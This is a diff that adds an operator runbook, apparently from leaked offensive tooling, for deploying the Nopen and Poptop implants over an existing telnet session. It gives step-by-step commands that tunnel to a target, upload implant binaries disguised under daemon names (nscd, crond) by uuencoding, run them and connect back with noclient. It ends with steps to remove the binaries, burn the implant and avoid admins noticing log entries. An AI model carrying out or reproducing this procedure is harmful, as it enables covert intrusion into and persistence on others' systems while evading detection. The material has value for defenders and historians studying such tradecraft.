@@ -1,0 +1,70 @@
+### EncTelnet/Poptop
+### To use Nopen over an existing connection (i.e. telnet)
+
+### Window 1: Nopen Window - Setup tunnel to dude telnetting to
+-tunnel
+l 2323 DUDE 23
+
+### Window 2: Local scripted window - Use spawn to be your telnet client
+### The window will look kinda funny with debug telnet negotiation stuff 
+### going by, and you'll see the typed password in the clear...get over it
+spawn.v3 127.0.0.1 2323 telnet
+<login as usual, unsets, blah blah...>
+
+### Window 3: Local window: prep poptop/noserver
+cp TARGNOSERVER /current/up/nscd
+cp TARGPOPTOP /current/up/crond
+compress nscd crond
+uuencode nscd.Z nscd.Z > nscd.uu
+uuencode crond.Z crond.Z > crond.uu
+
+### Window 2: Accept files for upload
+uudecode
+--p /current/up/nscd.uu
+uudecode
+--p /current/up/crond.uu
+uncompress nscd.Z crond.Z
+
+### Window 2: Run Nopen and poptop
+chmod 700 nscd crond
+PATH=. D=-lPORT nscd
+PATH=. crond
+
+### 1st prompt for "arg" is port
+PORT
+
+### 2nd prompt for "arg" is file descriptor, use 0 for stdin
+0
+
+### Should now get a line saying "tty is setup"
+
+### Window 4: Local scripted window: setup for Nopen connect
+noclient -l 8080
+
+### Window 2: type "---" and hit enter, should
+### have a connection in your noclient window then
+---
+
+### Window 4: To get multiple windows on target, will need use this window
+### as a -tunnel window, and tunnel to yourself over loopback
+### And oh yeah, remove the binaries
+-rm crond nscd
+-tunnel
+l PORT 127.0.0.1
+
+### In other scripted windows
+noclient 127.0.0.1:PORT
+
+### Do whatever you need to do...
+
+### When all done...
+-burnBURN
+
+### Window 2: this window will now probably go nuts, ^C will 
+### take you back to your op box shell prompt, and officially
+### close your telnet connection (see connection close in your
+### Window 1 -tunnel window).
+### Note that there will be another log entry put into
+### wtmp that cannot be toasted away, should not be seen by admins though...
+
+EOF
